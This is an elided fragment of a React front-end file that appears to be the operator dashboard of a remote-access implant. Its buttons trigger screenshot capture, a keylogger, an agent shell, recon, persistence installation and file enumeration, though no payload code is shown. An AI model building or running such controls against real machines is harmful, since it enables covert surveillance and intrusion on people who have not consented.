...
import {
  ...
  PlayCircle, Shell, ScanLine, MousePointerClick
} from 'lucide-react'
      ...
      <div className="page-container space-y-6">
        ...
        <section>
          ...
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            <QuickAction icon={Camera} label="Screenshot" description="Capture screen" color="info" onClick={() => runQuick('screenshot')} />
            <QuickAction icon={Keyboard} label="Keylog" description="Start keylogger" color="warning" onClick={() => runQuick('keylog', 'start')} />
            <QuickAction icon={Shell} label="Shell" description="Open agent shell" color="success" onClick={() => setTab('terminal')} />
            <QuickAction icon={Wifi} label="WiFi Scan" description="List networks" color="ghost" onClick={() => runQuick('wifi')} />
            <QuickAction icon={ScanLine} label="Recon" description="Run recon module" color="info" onClick={() => runQuick('recon')} />
            <QuickAction icon={Shield} label="Persist" description="Install persistence" color="warning" onClick={() => runQuick('persistence')} />
            <QuickAction icon={MousePointerClick} label="Click" description="UI interaction" color="ghost" onClick={() => runQuick('ui')} />
            <QuickAction icon={FileText} label="List Files" description="Enumerate directory" color="ghost" onClick={() => runQuick('files', 'list', { path: '.' })} />
          </div>
        </section>
